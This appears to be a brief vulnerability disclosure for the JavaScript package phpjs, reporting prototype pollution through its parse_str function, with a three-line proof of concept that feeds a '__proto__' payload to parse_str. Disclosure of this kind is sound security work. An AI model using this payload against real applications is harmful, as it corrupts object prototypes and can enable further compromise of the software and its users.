## Description
```phpjs``` is a community build php binding in javasciript.
This package is vulnearble to ```prototype pollution``` via ```parse_str```. 
## Proof Of Concept
```
const phpjs = require('phpjs')
phpjs.parse_str("__proto__[polluted]=true",{}); 
console.log(polluted)
```
